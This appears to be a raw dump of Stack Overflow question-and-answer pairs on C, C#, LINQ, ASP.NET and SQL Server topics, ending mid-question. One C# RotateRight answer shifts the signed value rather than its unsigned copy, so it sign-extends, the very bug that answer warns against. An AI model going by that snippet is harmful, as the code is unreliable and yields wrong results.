<p>I ran the program with the two example strings and the program would return just after the comparison of the first characters of the two strings. ret_val is -1 in the above case.</p>

<p>The definition of memcmp() which the above code snippet should conform to is:</p>

<p>The definition of the âCâ Library function memcmp is
int memcmp(const char *cs, const char *ct, size_t n)</p>

<p>Compare the first n characters of cs with the first n characters of ct. 
Return &lt; 0 if cs &lt; ct. 
Return > 0 if cs > ct. 
Return 0 if cs == ct. </p>

<p>There is definitely on LOGICAL error, could you help me find it.</p>
","33708","","<p>I guess since <code>char</code> signedness is implementation defined, you could make your comparison <code>unsigned</code>:</p>

<pre><code>int memcmp_test(const char *cs_in, const char *ct_in, size_t n)
{
  size_t i;  
  const unsigned char * cs = (const unsigned char*) cs_in;
  const unsigned char * ct = (const unsigned char*) ct_in;

  for (i = 0; i &lt; n; i++, cs++, ct++)
  {
    if (*cs &lt; *ct)
    {
      return -1;
    }
    else if (*cs &gt; *ct)
    {
      return 1;
    }
  }
  return 0;
}
</code></pre>
"
"<p>What is the C# equivalent (.NET 2.0) of _rotl and _rotr from C++?</p>
","33708","","<p>The naive version of shifting won't work. The reason is, right shifting signed numbers will fill the left bits with <strong>sign bit, not 0</strong>:</p>

<p>You can verify this fact with:</p>

<pre><code>Console.WriteLine(-1 &gt;&gt; 1);
</code></pre>

<p>The correct way is:</p>

<pre><code>public static int RotateLeft(this int value, int count)
{
    uint val = (uint)value;
    return (int)((val &lt;&lt; count) | (val &gt;&gt; (32 - count)));
}

public static int RotateRight(this int value, int count)
{
    uint val = (uint)value;
    return (int)((value &gt;&gt; count) | (value &lt;&lt; (32 - count)));
}
</code></pre>
"
"<p>I am using .NET MVC, and within view pages I set a contentplaceholder that contains an ID to be used on the master page like so:</p>

<p>View page:</p>

<pre><code>&lt;asp:Content ID=""CDomBodyId"" ContentPlaceHolderID=""DomBodyId"" runat=""server""&gt;LmpDemoRequests&lt;/asp:Content&gt;
</code></pre>

<p>Master page:</p>

<pre><code>&lt;body id='&lt;asp:ContentPlaceHolder ID=""DomBodyId"" runat=""server""&gt;&lt;/asp:ContentPlaceHolder&gt;'&gt;
</code></pre>

<p>So in this particular case, the body tag would render like this on the final HTML page:</p>

<pre><code>&lt;body id='LmpDemoRequests'&gt;
</code></pre>

<p>I would like to have double quotes around the body id tag, but inverting the quotes like the following makes intellisense unable to find the contentplaceholder, giving me a lot of warnings when I compile.</p>

<pre><code>&lt;body id=""&lt;asp:ContentPlaceHolder ID='DomBodyId' runat='server'&gt;&lt;/asp:ContentPlaceHolder&gt;""&gt;
</code></pre>

<p>Is there any way around this?</p>
","33708","","<p>This is an issue with ASP.NET editor. It's not specific to MVC. I think the workaround is pretty good and I don't see a specific drawback.</p>
"
"<p>Say I have an array of strings:</p>

<pre><code>string[] strArray = {""aa"", ""bb"", ""xx"", ""cc"", ""xx"", ""dd"", ""ee"", ""ff"", ""xx"",""xx"",""gg"",""xx""};
</code></pre>

<p>How do I use LINQ to extract the strings between the ""xx"" markers as groups?</p>

<p>Say by writing them to the console as:</p>

<pre><code>cc
dd,ee,ff
gg
</code></pre>
","33708","","<p>A pure-functional solution (mutation-free):</p>

<pre><code>string[] strArray = { ""aa"", ""bb"", ""xx"", ""cc"", ""xx"", ""dd"", 
                      ""ee"", ""ff"", ""xx"", ""xx"", ""gg"", ""xx"" };

var result = 
 strArray.Aggregate((IEnumerable&lt;IEnumerable&lt;string&gt;&gt;)new IEnumerable&lt;string&gt;[0],
   (a, s) =&gt; s == ""xx"" ? a.Concat(new[] { new string[0] })
      : a.Any() ? a.Except(new[] { a.Last() })
                   .Concat(new[] { a.Last().Concat(new[] { s }) }) : a)
         .Where(l =&gt; l.Any());

// Test
foreach (var i in result)
  Console.WriteLine(String.Join("","", i.ToArray()));
</code></pre>

<p>If you want to filter out the results past the last marker:</p>

<pre><code>string[] strArray = { ""aa"", ""bb"", ""xx"", ""cc"", ""xx"", ""dd"", 
                      ""ee"", ""ff"", ""xx"", ""xx"", ""gg"", ""xx""};

var result = 
  strArray.Aggregate(
    new { C = (IEnumerable&lt;string&gt;)null, 
          L = (IEnumerable&lt;IEnumerable&lt;string&gt;&gt;)new IEnumerable&lt;string&gt;[0] },
    (a, s) =&gt; s == ""xx"" ? a.C == null
        ? new { C = new string[0].AsEnumerable(), a.L }
        : new { C = new string[0].AsEnumerable(), L = a.L.Concat(new[] { a.C }) } 
        : a.C == null ? a : new { C = a.C.Concat(new[] { s }), a.L }).L
          .Where(l =&gt; l.Any());

// Test
foreach (var i in result)
  Console.WriteLine(String.Join("","", i.ToArray()));
</code></pre>
"
"<p>In php there is a function <code>phpinfo();</code> which displays a whole load of server stats and config information. What is the equivalent in ASP.NET? is there anything?</p>

<p>cheers</p>
","33708","","<p>There's not a <code>phpinfo</code> style function in ASP.NET. I think you can enable tracing in <code>Web.config</code> and navigate to <code>trace.axd</code> to see similar stuff.</p>
"
"<p>I wonder that there seems to be no text editor on the mac installed that is capable of saving just text without any formatting. Which text-only editors do you know that allow for editing text without any formatting like font sizes etc.?</p>
","33708","","<p><code>emacs</code>, <code>vim</code>, <code>nano</code></p>

<p>Mac OS X TextEdit supports editing text files without formatting.</p>
"
"<p>Is there a way to list all strings (that are not embeddet in a ressource) in a .net project?
I'm particulary interested in messagebox strings etc. so I can check if everything has been translated and written correctly. All tools I have tried so far can only list ressoure strings.</p>

<p>Any help very appreciated.</p>

<p>Ah forgot to say: I'm a Windows guy running Windows and only Windows, so please tell me something that runs on windows. I don't mind a simple way without using command line tool hacking etc., but will certainly do it if really neccessary.</p>

<p><strong>Update</strong>: It's possible to use regex expressions directly in VS search which is very handy.</p>

<blockquote>
  <p>(""[^""]*"")</p>
</blockquote>

<p>Matches all strings. However I want to list strings with at least one space character only.</p>

<p><strong>Update2</strong> ""([^""])+:b+([^""])+"" Does what I need. Hope it helps someone else.</p>

<p>Thanks!</p>
","33708","","<p>This should help to some extent:</p>

<p>Use <code>ildasm</code> to dump the IL to a file. Then run this in PowerShell:</p>

<pre><code>cat filename.il | where { $_.Contains(""ldstr"") }
</code></pre>
"
"<p>I have created a <a href=""http://en.wikipedia.org/wiki/Windows_Forms"" rel=""nofollow"">Windows Forms</a> application in .NET 2 using C#  that runs continuously. For most accounts I am pleased with it, but it has been reported to me that it has failed occasionally. I am able to monitor its performance for 50% of the time and I have never noticed a failure.</p>

<p>At this point I am concerned that perhaps the program is using too many resources and is not disposing of resources when they are no longer required.</p>

<p>What are the best practices for properly disposing created objects that have created timers and graphical objects like graphics paths, SQL connections, etc. or can I rely on the dispose method to take care of all garbage collection?</p>

<p>Also:
Is there a way that I could monitor resources used by the application?</p>
","33708","","<p>You should call <code>Dispose</code> on scarce resources to free them. You can use a <code>using</code> statement for that matter:</p>

<pre><code>using (var resource = new MyScarceObject()) 
{
    // resource will be used here...
} // will free up the resources by calling Dispose automatically
</code></pre>
"
"<p>I have a condition in a silverlight application that compares 2 strings, for some reason when I use <code>==</code> it returns <strong>false</strong> while <code>.Equals()</code> returns <strong>true</strong>. Here is the code:</p>

<pre><code> if (((ListBoxItem)lstBaseMenu.SelectedItem).Content.Equals(""Energy Attack""))
 {
// Execute code
 }

 if (((ListBoxItem)lstBaseMenu.SelectedItem).Content == ""Energy Attack"")
 {
// Execute code
 }
</code></pre>

<p>Any reason as to why this is happening?</p>
","33708","","<p>When <code>==</code> is used on an expression of type <code>object</code>, it'll resolve to <code>System.Object.ReferenceEquals</code>.</p>

<p><code>Equals</code> is just a <code>virtual</code> method and behaves as such, so the overridden version will be used (which, for <code>string</code> type compares the contents).</p>
"
"<p>Can we implement a enterprise wide intranet application completely with WinForms instead of Browser based Web apps?
What are pros and cons and which is preferred over other?</p>
","33708","","<p>Some stuff on my mind:</p>

<h3>WinForms Pros</h3>

<ul>
<li>Richer user experience</li>
<li>More responsive</li>
<li>Usually easier to write interactive processes</li>
</ul>

<h3>Web App Pros</h3>

<ul>
<li>Centralized maintenance (easy to update, ...)</li>
<li>Centralized data access security</li>
<li>Easier to access over the Internet and on the go</li>
<li>Does not rely on anything except a browser on the client (so the client platform doesn't matter)</li>
</ul>
"
"<p>I'm creating a specialised proxy class that implements <code>IList&lt;T&gt;</code> and wraps an internal <code>List&lt;T&gt;</code> instance.</p>

<p><code>List&lt;T&gt;</code> itself implements <code>IList&lt;T&gt;</code>, which declares a member <strong>bool IsReadOnly</strong>, but when I try to access that member from my own class, I can't because in <code>List&lt;T&gt;</code>, IsReadOnly is private.</p>

<p>So my question is; if an implementation of an interface requires all implemented members to be public, why does <code>List&lt;T&gt;</code> get to implement IsReadOnly as private and thus deny me access to it?</p>
","33708","","<p>It implements the interface member explicitly.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/aa288461(VS.71).aspx"">http://msdn.microsoft.com/en-us/library/aa288461(VS.71).aspx</a></p>

<p>Note that this does not make the interface member <code>private</code>. It's still available publicly, but only if you look at the object through the interface (with casting).</p>
"
"<p>Unlike Java, why does C# treat methods as non-virtual functions by default?  Is it more likely to be a performance issue rather than other possible outcomes?</p>

<p>I am reminded of reading a paragraph from Anders Hejlsberg about several advantages the existing architecture is bringing out. But, what about side effects? Is it really a good trade-off to have non-virtual methods by default?</p>
","33708","","<p>Classes should be <em>designed</em> for inheritance to be able to take advantage of it. Having methods <code>virtual</code> by default means that every function in the class can be plugged out and replaced by another, which is not really a good thing. Many people even believe that classes should have been <code>sealed</code> by default.</p>

<p><code>virtual</code> methods can also have a slight performance implication. This is not likely to be the primary reason, however.</p>
"
"<p>I've just finished writing a web server in C#. Its pretty basic and only serves static content like html, xml, and images at the moment. I would like to implement a dynamic language, however. I'm trying to choose between one of the following:</p>

<ul>
<li>ASP.NET</li>
<li>PHP</li>
<li>Python</li>
</ul>

<p>I'd prefer to implement PHP or Python because I am much more familiar with those, however I would like to implement whichever might be easiest. How would I go about adding this functionality to my server, and which of the three languages would be the easiest to implement?</p>

<p>EDIT: this is not about what language i want to do web programing in, this is about what language i want to let people who use the server program in. I would like to be able for the server to serve applications written in either asp.net, PHP or Python.</p>
","33708","","<p>ASP.NET will surely be the easiest as you can use all the built in classes. Essentially you don't need to build it, you just hook it up to the Web server (I don't know if we can count it as <em>writing</em> ASP.NET though ;) )</p>

<p>You might want to look at <a href=""http://blogs.msdn.com/dmitryr/archive/2006/03/09/548131.aspx"" rel=""nofollow"">Cassini source code</a></p>
"
"<p>I'm writing a .NET adaptor for a C/C++ library where a method ""bar"" takes a regular stdio FILE*. Is it possible to build an interface so that managed code user can pass a managed (File)Stream? That is without creating an intermediary buffer and code to pipe the data between. Also does the assumption that bar() reads only make things any better?</p>

<pre><code>// native code
void bar(FILE*);

// interface for managed code
void foo(System::IO::FileStream^ file)
{
    FILE* stdio_handle = ???;

    bar(stdio_handle);
}
</code></pre>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/system.io.filestream.handle.aspx"" rel=""nofollow""><code>System.IO.FileStream.Handle</code></a></p>

<p>It's not necessarily <code>stdio</code> handle. It's a Windows handle. I don't think <code>FileStream</code> is built upon <code>stdio</code> to have a <code>stdio</code> handle.</p>

<p>As Marc pointed out and mentioned in the MSDN link, you might want to consider using <code>SafeFileHandle</code> property (if you are on .NET 2.0+) instead of <code>Handle</code> (which is now considered obsolete). Only <code>Handle</code> is available in older versions, though.</p>
"
"<p>Most of the time when we read the file stream into a byte array, we would write the following code:-</p>

<pre><code> Dim inputStream As New System.IO.FileStream(filePath, IO.FileMode.Open)
 Dim fileLength As Integer= CType(inputStream.Length, Integer)
 Dim input(fileLength) As Byte

 Using inputStream
     inputStream.Read(input, 0, fileLength)
 End Using
</code></pre>

<p>But here we have to convert Length into an integer type (line 2 of the code above) since we cannot declare a byte array using the long data type (with option strict on). Is this a good practice? What is the work around for this problem?</p>
","33708","","<p>The good practice is to use <a href=""http://msdn.microsoft.com/en-us/library/System.IO.File.ReadAllBytes%28loband%29.aspx"" rel=""nofollow""><code>File.ReadAllBytes</code></a> instead of the whole thing:</p>

<pre><code>Dim input = File.ReadAllBytes(filePath)
</code></pre>

<p>By the way, if your file is going to be <strong>that large</strong> (more than 4 GB), you wouldn't want to load it all at once in a byte array as it'll take up 4GB RAM (and in a 32 bit managed process, you can't have it at all, even if you have got more RAM).</p>
"
"<p>I am curious which IDE does Google use for C++ and Java development?</p>
","33708","","<p>Google is not a single person. Probably lots of IDEs and tools are used there.</p>
"
"<p>Is it possible to develop ASP.NET MVC with MS Visual C# 2008 Express Edition and IIS?</p>

<p>The <a href=""http://www.asp.net/learn/mvc/tutorial-21-cs.aspx"" rel=""nofollow"">tutorial</a> states that 'Visual Studio 2008 or Visual Web Developer 2008 Express' are required.</p>
","33708","","<p>What do you mean regarding running ASP.NET MVC projects? To run it, you'd need a Web server rather than Visual Studio. For development, you can develop a class library in C# Express that will be used in an ASP.MVC app but project templates are only available for Web development product line (Visual Web Developer or full VS)</p>

<p>Update to reflect OP edit: To develop apps <em>effectively</em>, you'll need Visual Web Dev or VS. There's no point in not using VWD Express as it's free.</p>
"
"<p>How do i convert hh:mm:ss to hh:mm in sql server?</p>

<pre><code>select Count(Page) as VisitingCount,Page,CONVERT(VARCHAR(8),Date, 108) from scr_SecuristLog   
where Date between '2009-05-04 00:00:00' and '2009-05-06 14:58'  
and [user] in(select USERNAME             
    from scr_CustomerAuthorities )  
group by Page,Date order by [VisitingCount] asc  </code></pre>
","33708","","<p>For this specific need you should use the between method as noted by <a href=""http://stackoverflow.com/questions/820155/how-do-i-convert-hhmmss-to-hhmm-in-sql-server/820174#820174"">Quassnoi's answer</a>. However, the general problem can be solved with:</p>

<pre><code>select dateadd(second, -datepart(second, @date), @date)
</code></pre>
"
"<p>Are <strong>enum</strong> types faster/more efficient than <strong>string</strong> types when used as dictionary keys? </p>

<pre><code>IDictionary&lt;string,object&gt; or IDictionary&lt;enum,object&gt;
</code></pre>

<p>As a matter of fact, which data type is most suitable as a dictionary key and why?</p>

<p>Consider the following: <em>NOTE: Only 5 properties for simplicity</em></p>

<pre><code>struct MyKeys
{
   public string Incomplete = ""IN""; 
   public string Submitted = ""SU""; 
   public string Processing=""PR""; 
   public string Completed = ""CO""; 
   public string Closed = ""CL"";   
}
</code></pre>

<p>and</p>

<pre><code>enum MyKeys
{
   Incomplete, 
   Submitted, 
   Processing, 
   Completed, 
   Closed
}
</code></pre>

<p>Which of the above will be better if used as keys in a dictionary!</p>
","33708","","<p>Certainly the <code>enum</code> version is better (when both are applicable and make sense, of course). Not just for performance <em>(it can be better or worse, see Rashack's very good comment)</em> as it's checked compile time and results in cleaner code.</p>

<p>You can circumvent the comparer issue by using <code>Dictionary&lt;int, object&gt;</code> and casting <code>enum</code> keys to <code>int</code>s or specifying a custom comparer.</p>
"
"<p>Is it possible to redefine a C# keyword like <code>int</code> to use Int64 instead of Int32?</p>

<p>If not, how can one do this? I want to have the flexibility to redefine the int I use, so later I could change it to int64 if I wanted, instead of going around to replace all the int values manually.</p>
","33708","","<p>Add </p>

<pre><code>using MyIntType = System.Int64;
</code></pre>

<p>after the <code>namespace</code> declaration.</p>
"
"<p>I have an application that interacts with another application using SendMessage (among other things). Everything works fine until the other application hangs (either because it has actually frozen or it is doing a long, blocking call). I would like to simulate an application hanging using a C# WinForms application. Is there any way to start a long running, blocking call? Or maybe a way to cause the application to actually freeze? Maybe something like WebClient.DownloadString(), but something that will never return.</p>
","33708","","<pre><code>while(true) { } // busy waiting
Thread.Sleep(time); // blocking
</code></pre>
"
"<p>I have a producer which provides a System.IO.Stream instance.
I also have several clients which consume this stream.</p>

<p>Is it possible to give each client a ""private view"" of the stream? For example, if clientA reads from the stream, it doesn't affect the position clientB sees (i.e. if clientB start reading from the stream, it gets the beginning of it, not from where clientA left the position).
If it makes any difference, the clients are only reading from the stream.</p>

<p>Hope it makes sense.</p>

<p>Thanks in advance,
Mike</p>
","33708","","<p>You could inherit a class from <code>Stream</code> that takes the underlying stream in the constructor and keeps track of the position of that instance of private view. This works only if the base stream is seekable.</p>
"
"<p>I'm interested in writing a compiler for a intermediate byte-code language like C# (a subset of).  I'm trying to accumulate all the resources and information I can before the project begins.</p>

<p>I'll be writing the compiler <em>in</em> C# as well, so hopefully down the line my compiler will be able to dogfood itself.</p>

<p>The best resource I have found so far is, <a href=""http://blogs.msdn.com/jmstall/archive/2005/02/06/368192.aspx"">Blue - The C# Compiler Written in Pure C#</a>, which is open-source.  I've already flipped through its source code and it will be a great resource.</p>

<p>One thing about this project is my CLR knowledge isn't up to par yet and it is one of the things I'm looking to get a deeper insight into by writing this term project.</p>

<p>I'm not looking for general compiler-construction resources, I have plenty of those.  I'm looking for resources that will aid me specifically in writing a C# compiler. </p>

<ol>
<li>What are some good resources for learning the nitty gritty details of .NET/CLR internals?  </li>
<li>What is the best resource on MSIL?   </li>
<li>Should I use the <a href=""http://www.antlr.org"">ANTLR Parser Generator</a> since it lists C# as a target code-gen language or would you consider this ""cheating"" in terms of this project?</li>
</ol>
","33708","","<p>I just answer 3: I think it's perfectly valid and not considered cheating to use a parser generator. Writing a parser (in code) is a highly error prone and mechanical task without much benefits (in terms of learning stuff).</p>
"
"<p>I have read the various questions/answers here that basically indicate that having a clustered index on a uniqueidentifier column is a poor choice for performance reasons. Regardless, I need to use a uniqueidentifier as my primary key, and I do NOT want to use newsequentialid() because the generated values are too similar to one another (I need more random IDs so users can't [reasonably] 'guess' another ID).</p>

<p>So, what is the best way to index this PK? Even though a clustered index on this column is not ideal, is it better than a ""unique, non-clustered"" index?</p>

<p>I'm using SQL Server 2005.</p>
","33708","","<p>First of all, if you are trying to use <code>NEWID()</code> to achieve randomness (more than just looking random), you're in trouble.</p>

<p>It's usually less than ideal choice because other indexes will reference the clustered index key and a long clustered index key will degrade the performance of all indexes. You could create an <code>IDENTITY</code> integer column and make that the clustered index and just create a non-clustered unique index on the <code>uniqueidentifier</code> column.</p>
"
"<p>I need to make a button focus at the end of a thread.
The Button.Focus() method does not seem to work.</p>

<p>for exmaple:</p>

<pre><code>Button1_Click(object sender, EventArgs e)
{
   Thread myThread = new Thread(theThread);
   myThread.Start();
}

theThread()
{
  ... 
  Button2.Focus(); // does not seem to focus the button
}
</code></pre>

<p>However, if I put Button2.Focus() in Button1_Click it will focus, but for my project I can't do that.</p>
","33708","","<p>For a generic solution to these kind of problems, take a look at <a href=""http://msdn.microsoft.com/en-us/library/system.threading.synchronizationcontext.aspx"" rel=""nofollow""><code>SyncronizationContext</code></a> class. For Windows forms, however, you could use the <a href=""http://msdn.microsoft.com/en-us/library/zyzhdc6b.aspx"" rel=""nofollow""><code>Invoke</code></a> method and in WPF, you could use <a href=""http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher.invoke.aspx"" rel=""nofollow""><code>Dispatcher.Invoke</code></a>:</p>

<pre><code>//WinForms:
Invoke(delegate{ Button2.Focus(); });
</code></pre>
"
"<p>We're trying to implement formsAuthentication on our site, but in a scenario that we haven't been able to find a solution for yet - other than creating our own HttpModule and doing the custom logic ourselves - so I thought I'd toss the question out there to see if this was indeed the only solution.</p>

<p>We'd like to use formsAuthentication on top of custom Membership providers, but would like to use a different provider for different folders.  Our site partitions these sections with subfolders (eg: ~/Admin, ~/GoldCustomer, ~/SilverCustomer, ~/BronzeCustomer), so we'd like to use different Membership providers for each section/subfolder.  Using the framework to support this, we'd implement our web.config like:</p>

<pre><code>&lt;configuration xmlns=""http://schemas.microsoft.com/.NetConfiguration/v2.0""&gt;
&lt;location path=""Admin""&gt;
&lt;system.web&gt;
  &lt;authentication mode=""Forms""&gt;
    &lt;forms name=""AdminAuth"" loginUrl=""~/AdminLogin.aspx"" /&gt;
  &lt;/authentication&gt;
  &lt;membership defaultProvider=""AdminProvider"" &gt;
    &lt;providers &gt;
      &lt;add connectionStringName=""ConnString"" name=""AdminProvider"" type=""Assembly.AdminMembershipProvider"" ... /&gt;
    &lt;/providers&gt;
  &lt;/membership&gt;
&lt;/system.web&gt;
&lt;/location&gt;
&lt;location path=""GoldCustomer""&gt;
  &lt;system.web&gt;
  &lt;authentication mode=""Forms""&gt;
    &lt;forms name=""GoldCustomerAuth"" loginUrl=""~/GoldCustomerLogin.aspx"" /&gt;
  &lt;/authentication&gt;
  &lt;membership defaultProvider=""GoldCustomerProvider"" &gt;
    &lt;providers &gt;
      &lt;add connectionStringName=""ConnString"" name=""GoldCustomerProvider"" type=""Assembly.GoldCustomerMembershipProvider"" ...="""" /&gt;
    &lt;/providers&gt;
  &lt;/membership&gt;
&lt;/system.web&gt;
&lt;/location&gt;
&lt;system.web&gt;
  &lt;compilation debug=""true"" /&gt;
  &lt;authentication mode=""Forms"" /&gt;
&lt;/system.web&gt;
&lt;/configuration&gt;
</code></pre>

<p>Doing this though results in the runtime error:</p>

<p>It is an error to use a section registered as allowDefinition='MachineToApplication' beyond application level.  This error can be caused by a virtual directory not being configured as an application in IIS.</p>

<pre><code>Line 11:   &lt;location path=""Admin""&gt;
Line 12:     &lt;system.web&gt;
Line 13:       &lt;authentication mode=""Forms""&gt;
Line 14:         &lt;forms name=""FormsAdmin"" loginUrl=""~/login.aspx"" /&gt;
Line 15:       &lt;/authentication&gt;
</code></pre>

<p>It seems that the only way to accomplish what we're trying is with a custom HttpModule - or change our approach (like breaking the folders up into different web apps in IIS).  Is this correct, or am I missing something?  Or are there other alternatives I'm not aware of?</p>

<p>Thanks for your help!</p>
","33708","","<p>First of all, I think role-based security makes perfect sense for your application if you have control over the databases. But if you can't change it, it's a no-go.</p>

<p>The alternative solution can be a gateway login forms that redirects user to folder specific login form based on <code>ReturnUrl</code> querystring variable and that form will use the provider it wants to validate the user. Then it uses the <code>FormsAuthentication.RedirectFromLoginPage</code> to set an authentication cookie and redirect to the previous page. You can set the roles and use role based security to control access to each folder with <code>&lt;authorization&gt;</code> tag in <code>web.config</code>.</p>
"
"<p>Alright, so let's say I'm writing an application using an object-oriented language, and I have a set of key-value pairs that represent program parameters/configuration/options/settings/etc. These may be initial values of certain variables, or just values that aren't bound to change except between sessions. How should I represent these values in my data model? </p>

<p>My initial thought is to simply store all the values in single class that is globally accessible (singleton perhaps), because these values will be used in various places in the code. This, however, will make all the other classes dependent on this singleton. </p>

<p>Is that a problem in this situation? Is there another, ideal solution that I haven't thought of? How do you people usually represent this type of data? Is there anything else I should be aware of concerning this problem?</p>

<p>Thanks</p>
","33708","","<p>You might want to use dependency injection. Create an interface <code>IConfigurationProvider</code>. Create a class <code>DefaultConfigurationProvider</code> that implements that interface and does the actual task. Makes other object that rely on config data expect an <code>IConfigurationProvider</code> instance and provide them with an instance of <code>DefaultConfigurationProvider</code>. Most dependency injection frameworks will handle this for you.</p>
"
"<pre><code>int main()
{
  int var = 0;; // Typo which compiles just fine
}
</code></pre>
","33708","","<p>Because you might need something like this:</p>

<pre><code>while (x++ &lt; 10);
</code></pre>

<p>In this statement, the semicolon is considered the <code>while</code> body. It's still a valid statement but it doesn't do anything. This increases the consistency of the language.</p>
"
"<p>The title speaks for itself. I'm building a <strong>winforms</strong> C# 2.0 app. 
Any tutorials or inspiring ideas?</p>
","33708","","<p>There's not much difference between a local SQL Server instance and a distant one. You just set something like <code>Server=sqlserver.remote-machine.com</code> in your connection string.</p>
"
"<p>A colleague and I had a heated debate yesterday whether it is safe to send login credentials via URL parameters as a means of authentication.  He correctly pointed out that HTTPS encrypts all non-hostname/port characters in a URL before sending a request to the server side.</p>

<p>However, I still think there are edge cases here where it is possible to steal these credentials, and believe they should be sent via an HTTPS POST.  Is this actually a safe means of sending login/token data?</p>
","33708","","<p>The requested URL might show up in <strong>Web server logs</strong> and <strong>browser history/bookmarks</strong> which is not a good thing.</p>
"
"<p>I have 14 LINQ queries to resolve in one method. None of them have a base query that I could hang them from as subqueries and then store the results as properties of an anonymous type instance.</p>

<p>Rather than making 14 separate calls to the database, how can I ensure that they are all called in the same operation?</p>

<p><strong>UPDATE</strong></p>

<p>I ended up using a dodgy hack which did the trick. I know that there will ALWAYS be at least one user in the user table, so I ended up using:</p>

<pre><code>var data = (from tmp in DataContext.Users
            select new {
                Property1 = (from...),
                Property2 = (from...),
                PropertyN = (from...),
            }).First();
</code></pre>

<p><strong>UPDATE 2</strong></p>

<p>It has been implied in one of the answers that doing this may create MARS (Multiple Active Result Set) errors. What are these errors (I have never seen one), why do they occur and is there anything wrong the whole premise of this line of questioning? i.e. Am I flawed in my assertion that asking the database to return everything in one go is going to be quicker/more efficient than doing fourteen wholly separate LINQ queries?</p>

<p><strong>UPDATE 3</strong></p>

<p>I think my approach is redundant and from a pragmatic perspective, should be handled differently, either via a stored procedure or some sort of delayed/mixed approach.</p>
","33708","","<p>I'm not completely sure about your queries but you could encapsulate the query logic in a stored procedure drag it with LINQ to SQL data context designer to use.</p>

<p>If you need the results independently and you really don't want the round trip to database server, I think you should fall back to <code>SqlDataReader</code> and use <code>NextResult</code> by calling a procedure that retrieves the whole data.</p>
"
"<p>I wonder if there is any optimization I can do to achieve faster SELECTs for spatial data without moving to SQL SERVER 2008. There is for SQL Server 2005, natively or through plugins, any of the features below?</p>

<ol>
<li>Spatial field types</li>
<li>Spatial indexes</li>
<li>Arcsin math function for surface distance calculation on a sphere (Earth)</li>
</ol>
","33708","","<p>Just 3 is there in 2005 (<a href=""http://msdn.microsoft.com/en-us/library/ms181581%28SQL.90%29.aspx"" rel=""nofollow""><code>ASIN</code></a>). Spatial stuff are <a href=""http://www.microsoft.com/sqlserver/2008/en/us/spatial-data.aspx"" rel=""nofollow"">new in 2008</a>.</p>
"
"<p>I have created an IEnumerable list of racing drivers using LINQ from a string array as such below:</p>

<pre><code>string[] driverNames = {
                              ""Lewis Hamilton"", 
                              ""Heikki Kovalainen"",
                              ""Felipe Massa"",
                              ""Kimi Raikkonen"",
                              ""Robert Kubica"",
                              ""Nick Heidfeld"",
                              ""Fernando Alonso"",
                              ""Nelson Piquet Jr"",
                              ""Jarno Trulli"",
                              ""Timo Glock"",
                              ""Sebastien Bourdais"",
                              ""Sebastien Buemi"",
                              ""Mark Webber"",
                              ""Sebastian Vettel"",
                              ""Nico Rosberg"",
                              ""Kazuki Nakajima"",
                              ""Adrian Sutil"",
                              ""Giancarlo Fisichella"",
                              ""Jenson Button"",
                              ""Rubens Barrichello""
                          };

IEnumerable&lt;string&gt; result = from driver in driverNames
                             orderby driver
                             select driver;
</code></pre>

<p>I am just keeping it simple for now.</p>

<p>I then bind it to a ASP.NET GridView like so below:</p>

<pre><code>GV_CurrentF1Drivers.DataSource = result;
GV_CurrentF1Drivers.DataBind();
</code></pre>

<p>This works fine. Now I want to take the same output (result) and bind it to a repeater but no matter what I try I can not get the repeater to work and I think I am missing some key understanding of LINQ and how it works with ASP.NET.</p>

<p>Below is the full aspx page to show where I have got to so far. Please can somebody (gently if possible) guide me back on to the path?</p>

<pre><code>&lt;%@ Page Language=""C#"" AutoEventWireup=""true"" CodeFile=""Example1.aspx.cs"" Inherits=""Example1"" %&gt;

&lt;!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""&gt;
&lt;html xmlns=""http://www.w3.org/1999/xhtml""&gt;
&lt;head runat=""server""&gt;
    &lt;title&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form id=""form1"" runat=""server""&gt;
    &lt;div style=""float: left;""&gt;
        &lt;asp:GridView ID=""GV_CurrentF1Drivers"" runat=""server"" /&gt;
    &lt;/div&gt;
    &lt;div style=""float: left;""&gt;
        &lt;asp:Repeater ID=""R_CurrentF1Drivers"" runat=""server""&gt;
            &lt;ItemTemplate&gt;
                &lt;%# Eval(""driver"") %&gt;&lt;/ItemTemplate&gt;
        &lt;/asp:Repeater&gt;
    &lt;/div&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>I use the following code to bind the result to the Repeater:</p>

<pre><code>R_CurrentF1Drivers.DataSource = result;
R_CurrentF1Drivers.DataBind();
</code></pre>

<p>I get the following error when I try to run the page with the Repeater in:</p>

<p><b>Exception Details:</b> System.Web.HttpException: DataBinding: 'System.String' does not contain a property with the name 'driver'.</p>
","33708","","<p>Change <code>&lt;%# Eval(""driver"") %&gt;</code> to </p>

<pre><code>&lt;%# Container.DataItem %&gt;
</code></pre>
"
"<p>I have the following setup for my Blog Data Model:</p>

<pre>
Blog               Articles             Categories
-----              --------          1  ----------
ID  \ 1         *  ID            /----- ID
Name \------------ BlogID       /       Name 
Owner              Name      * /      
                   CategoryID-/
</pre>

<p>I'm worried about how this data model matches the 'best practices' for Blogs.  If a Blog is deleted, should all the articles for that blog be deleted? If a Category is deleted, what should happen to the Articles?</p>

<p>Is there a better way? Is there something I'm missing?  What do 'best-practices' suggest to do?</p>
","33708","","<p>Depends. If your blog engine does not allow an entry without an specified category, you should probably notify the user of the consequence and delete the articles. Otherwise you could use an <code>ON DELETE SET NULL</code> instead.</p>
"
"<p>In a SortedDictionary  is it possible to <em>change</em> the value of an item ?</p>
","33708","","<p>Yes, why not?</p>

<pre><code>sortedDictionary[key] = newValue;
</code></pre>
"
"<p>Should I always have a primary key in my database tables?</p>

<p>Let's take the SO tagging. You can see the tag in any revision, its likely to be in a tag_rev table with the postID and revision number. Would I need a PK for that?</p>

<p>Also since it is in a rev table and not currently use the tags should be a blob of tagIDs instead of multiple entries of multiple post_id tagid pair?</p>
","33708","","<p>A <strong>table</strong> should have a primary key so that you could identify each row uniquely with it.</p>

<p>Technically, you <strong>can</strong> have tables without a primary key, but you'll be breaking good database design rules.</p>
"
"<p>Another interview question which was expecting a true / false answer and I wasn't too sure.</p>

<h3>Duplicate</h3>

<ul>
